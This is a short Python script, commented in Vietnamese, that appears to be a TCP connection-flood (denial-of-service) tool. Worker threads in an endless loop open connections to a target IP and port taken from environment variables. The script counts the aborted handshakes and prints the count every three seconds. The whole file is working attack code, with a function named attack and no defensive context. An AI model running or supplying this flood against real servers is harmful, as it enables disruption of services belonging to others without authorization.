import socket
import threading
import time
import sys
import os

# Đọc từ biến môi trường, nếu không có thì dùng giá trị mặc định
target_ip = os.getenv("TARGET_IP", "127.0.0.1")
target_port = int(os.getenv("TARGET_PORT", 80))
timeout = float(os.getenv("TIMEOUT", 0.1))   # giây
num_threads = int(os.getenv("NUM_THREADS", 2))

dropped_count = 0
dropped_lock = threading.Lock()

def attack():
    global dropped_count
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((target_ip, target_port))
        except socket.timeout:
            with dropped_lock:
                dropped_count += 1
        except Exception:
            pass
        finally:
            s.close()

def display():
    while True:
        time.sleep(3)  # cập nhật mỗi 3 giây
        with dropped_lock:
            count = dropped_count
        print(f"Lượt handshake bỏ dở: {count}")

# Khởi chạy threads attack
for _ in range(num_threads):
    t = threading.Thread(target=attack, daemon=True)
    t.start()

# Khởi chạy thread hiển thị
display_thread = threading.Thread(target=display, daemon=True)
display_thread.start()

# Giữ main thread chạy vô hạn
while True:
    time.sleep(1)
